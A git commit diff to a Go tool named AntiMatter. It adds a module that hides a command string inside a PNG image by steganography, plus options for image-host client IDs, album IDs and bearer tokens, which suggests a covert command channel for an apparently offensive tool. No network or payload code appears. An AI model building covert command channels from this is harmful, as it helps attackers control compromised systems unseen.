85f341d386fac6d45686c02b744bb5f258cf958e
AnubisSec <38790814+AnubisSec@users.noreply.github.com>
2020-06-18 22:36:44 -0400

    Added image options, create image function, along with stego encoding

--- anti.go
+++ anti.go
@@ -2,11 +2,14 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"errors"
 	"fmt"
+	"image/png"
 	"os"
 	"strings"
 
+	stego "github.com/auyer/steganography"
 	"github.com/fatih/color"
 	"github.com/manifoldco/promptui"
 )
@@ -22,7 +25,27 @@ func validateOptions(slice []string, val string) bool {
 }
 
 // Global map for the Image module
-var imageOptions = map[string]string{"Command": "", "Response": "", "BaseImage": "", "NewFilename": "", "ClientID": "", "AlbumID": ""}
+var imageOptions = map[string]string{"Command": "", "Response": "", "BaseImage": "", "NewFilename": "", "ClientID": "", "AlbumID": "", "BearerToken": ""}
+
+func createImage(command string, response string, img_path string, img_name string, token string) {
+	inFile, _ := os.Open(img_path)
+	reader := bufio.NewReader(inFile)
+	img, _ := png.Decode(reader)
+
+	w := new(bytes.Buffer)
+	err := stego.Encode(w, img, []byte(command))
+	if err != nil {
+		fmt.Printf("Error encoding file %v", err)
+		return
+	} else {
+		fmt.Println("[+] Success creating file!")
+	}
+
+	outFile, _ := os.Create(img_name)
+	w.WriteTo(outFile)
+	outFile.Close()
+
+}
 
 func main() {
 	for {
@@ -82,7 +105,6 @@ func main() {
 
 		if strings.EqualFold(result, "Image") {
 			for {
-				fmt.Println("\n")
 				reader := bufio.NewReader(os.Stdin)
 				color.Set(color.FgGreen)
 				fmt.Print("AntiMatter/Image > ")
@@ -107,7 +129,38 @@ func main() {
 
 						// Left off here, TODO: Add the rest of the Image module options
 					} else if strings.Contains(text, "response") {
+						if strings.Contains(text, "s") {
+							imageOptions["Response"] = "Short"
+							imageOptions["ClientID"] = ""
+							imageOptions["AlbumID"] = ""
+						}
+						//if strings.Contains(text, "n") {
+						//	imageOptions["Response"] = "No"
+						//	}
+						if strings.Contains(text, "l") {
+							imageOptions["Response"] = "Long"
+							imageOptions["BearerToken"] = ""
+							imageOptions["AlbumID"] = ""
+						}
+					} else if strings.Contains(text, "base-image") {
+						baseImage := strings.Split(text, "base-image ")
+						imageOptions["BaseImage"] = strings.Replace(strings.Join(baseImage[1:], ""), "\n", "", -1)
+					} else if strings.Contains(text, "new-filename") {
+						newFilename := strings.Split(text, "new-filename ")
+						imageOptions["NewFilename"] = strings.Replace(strings.Join(newFilename[1:], ""), "\n", "", -1)
+					} else if strings.Contains(text, "client-id") {
+						clientId := strings.Split(text, "client-id ")
+						imageOptions["ClientId"] = strings.Replace(strings.Join(clientId[1:], ""), "\n", "", -1)
+					} else if strings.Contains(text, "album-id") {
+						albumId := strings.Split(text, "album-id ")
+						imageOptions["AlbumId"] = strings.Replace(strings.Join(albumId[1:], ""), "\n", "", -1)
+					} else if strings.Contains(text, "bearer-token") {
+						bearerToken := strings.Split(text, "bearer-token ")
+						imageOptions["BearerToken"] = strings.Replace(strings.Join(bearerToken[1:], ""), "\n", "", -1)
 					}
+
+				} else if strings.Contains(text, "go") {
+					createImage(imageOptions["Command"], imageOptions["Response"], imageOptions["BaseImage"], imageOptions["NewFilename"], imageOptions["BearerToken"])
 
 				} else if strings.Contains(text, "exit") {
 					break
